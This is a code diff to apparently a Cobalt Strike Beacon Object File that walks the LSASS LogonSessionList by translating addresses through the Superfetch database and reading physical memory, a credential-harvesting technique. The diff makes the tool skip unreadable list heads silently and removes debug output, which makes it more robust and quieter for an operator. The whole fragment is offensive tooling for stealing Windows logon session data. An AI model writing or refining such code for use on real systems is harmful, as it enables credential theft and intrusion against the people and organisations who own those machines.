@@ -139,7 +139,8 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
 
     // Get the first Flink to start the traversal
     // poi(lsasrv!LogonSessionList)
-    TranslateUVA2Physical(LogonSessionListHead, &tmpPA, lower32bits, LsassPID);
+    if (!TranslateUVA2Physical(LogonSessionListHead, &tmpPA, lower32bits, LsassPID))
+        return TRUE; // This sub-list head page isn't in the Superfetch DB; skip silently
     Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
 
     
@@ -268,11 +269,9 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
         BeaconFormatPrintf(&outputbuffer, "\n");
         TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
         Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Next Flink: 0x%llx (head=0x%llx)\n", Flink, LogonSessionListHead);
 
         i++;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] LogonSessionList traversal complete (%d entries processed).\n", i);
 
     return TRUE;
 }
